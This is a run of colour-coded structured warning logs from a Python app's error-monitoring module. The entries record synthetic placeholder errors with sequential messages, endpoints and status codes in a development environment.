WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.936358Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m93[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4618'[0m [36merror_type[0m=[35merror_type_18[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_18[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m418[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.936406Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m93[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4619'[0m [36merror_type[0m=[35merror_type_19[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_19[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m419[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.936454Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m93[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4620'[0m [36merror_type[0m=[35merror_type_20[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_20[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m420[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.936503Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m93[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4621'[0m [36merror_type[0m=[35merror_type_21[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_21[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m421[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.936550Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m93[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4622'[0m [36merror_type[0m=[35merror_type_22[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_22[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m422[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.936598Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m93[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4623'[0m [36merror_type[0m=[35merror_type_23[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_23[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m423[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.936645Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m93[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4624'[0m [36merror_type[0m=[35merror_type_24[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_24[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m424[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.936692Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m93[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4625'[0m [36merror_type[0m=[35merror_type_25[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_25[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m425[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.936739Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m93[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4626'[0m [36merror_type[0m=[35merror_type_26[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_26[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m426[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.936839Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m93[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4627'[0m [36merror_type[0m=[35merror_type_27[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_27[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m427[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.936911Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m93[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4628'[0m [36merror_type[0m=[35merror_type_28[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_28[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m428[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.936967Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m93[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4629'[0m [36merror_type[0m=[35merror_type_29[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_29[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m429[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.937019Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m93[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4630'[0m [36merror_type[0m=[35merror_type_30[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_30[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m430[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.937071Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m93[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4631'[0m [36merror_type[0m=[35merror_type_31[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_31[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m431[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.937120Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m93[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4632'[0m [36merror_type[0m=[35merror_type_32[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_32[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m432[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.937171Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m93[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4633'[0m [36merror_type[0m=[35merror_type_33[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_33[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m433[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.937219Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m93[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4634'[0m [36merror_type[0m=[35merror_type_34[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_34[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m434[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.937267Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m93[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4635'[0m [36merror_type[0m=[35merror_type_35[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_35[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m435[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.937315Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m93[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4636'[0m [36merror_type[0m=[35merror_type_36[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_36[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m436[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.937363Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m93[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4637'[0m [36merror_type[0m=[35merror_type_37[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_37[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m437[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.937415Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m93[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4638'[0m [36merror_type[0m=[35merror_type_38[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_38[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m438[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.937464Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m93[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4639'[0m [36merror_type[0m=[35merror_type_39[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_39[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m439[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.937514Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m93[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4640'[0m [36merror_type[0m=[35merror_type_40[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_40[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m440[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.937562Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m93[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4641'[0m [36merror_type[0m=[35merror_type_41[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_41[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m441[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.937610Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m93[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4642'[0m [36merror_type[0m=[35merror_type_42[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_42[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m442[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.937657Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m93[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4643'[0m [36merror_type[0m=[35merror_type_43[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_43[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m443[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.937705Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m93[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4644'[0m [36merror_type[0m=[35merror_type_44[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_44[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m444[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.937756Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m93[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4645'[0m [36merror_type[0m=[35merror_type_45[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_45[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m445[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.937804Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m93[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4646'[0m [36merror_type[0m=[35merror_type_46[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_46[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m446[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.937851Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m93[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4647'[0m [36merror_type[0m=[35merror_type_47[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_47[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m447[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.937902Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m93[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4648'[0m [36merror_type[0m=[35merror_type_48[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_48[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m448[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.937949Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m93[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4649'[0m [36merror_type[0m=[35merror_type_49[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_49[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m449[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.937997Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m94[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4650'[0m [36merror_type[0m=[35merror_type_0[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_50[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m450[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.938044Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m94[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4651'[0m [36merror_type[0m=[35merror_type_1[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_51[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m451[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.938091Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m94[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4652'[0m [36merror_type[0m=[35merror_type_2[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_52[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m452[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.938138Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m94[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4653'[0m [36merror_type[0m=[35merror_type_3[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_53[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m453[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.938186Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m94[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4654'[0m [36merror_type[0m=[35merror_type_4[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_54[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m454[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.938300Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m94[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4655'[0m [36merror_type[0m=[35merror_type_5[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_55[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m455[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.938369Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m94[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4656'[0m [36merror_type[0m=[35merror_type_6[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_56[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m456[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.938423Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m94[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4657'[0m [36merror_type[0m=[35merror_type_7[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_57[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m457[0m
